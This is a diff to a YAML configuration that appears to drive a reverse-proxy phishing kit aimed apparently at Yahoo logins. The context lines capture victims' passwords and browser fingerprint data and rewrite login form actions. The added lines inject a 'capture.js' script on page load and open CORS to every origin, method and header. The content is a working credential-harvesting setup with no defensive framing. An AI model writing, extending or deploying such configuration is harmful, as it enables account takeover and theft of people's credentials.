@@ -22,6 +22,7 @@ credentials:
   - {type: "post_param", name: "password", regex: null}
   - {type: "post_param", name: "browser-fp-data", regex: null}
 injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
   - trigger_path: "/"
     position: "body_end"
     content: |
@@ -43,3 +44,7 @@ form_actions:
   - {selector: "form[action]", action_to: "/account/challenge/password"}
 bridges:
   - {prefix: "/_img/", target_host: "s.yimg.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
